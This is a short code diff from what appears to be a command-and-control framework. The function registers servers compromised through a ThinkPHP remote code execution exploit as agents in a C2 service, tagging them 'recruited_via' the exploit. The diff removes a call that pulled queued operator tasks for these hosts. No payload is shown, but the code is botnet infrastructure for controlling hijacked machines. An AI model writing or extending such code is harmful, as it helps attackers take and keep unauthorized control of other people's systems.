@@ -463,7 +463,7 @@ def _rce_enroll(ip: str) -> None:
     import hashlib
 
     from app.core.db import SessionLocal
-    from app.services.c2_service import pull_next_task, register_agent
+    from app.services.c2_service import register_agent
 
     agent_id = "tp" + hashlib.sha1(f"{ip}:rce-session".encode()).hexdigest()[:22]
     try:
@@ -475,12 +475,6 @@ def _rce_enroll(ip: str) -> None:
                 payload_type="rce_session",
                 metadata_json={"recruited_via": "thinkphp_rce", "rce_proven": True},
             )
-            # Every exploit beat is also a dispatch beat: pull one queued
-            # operator task so the console reflects real delivery state.
-            # A passive channel has no receipt path — the task rides the
-            # lease/requeue cycle (dispatched → lease expiry → requeue) until
-            # an executor enrolls for this identity.
-            pull_next_task(db, agent_id=agent.agent_id)
     except Exception:
         logger.exception("rce enroll failed for %s", ip)
 
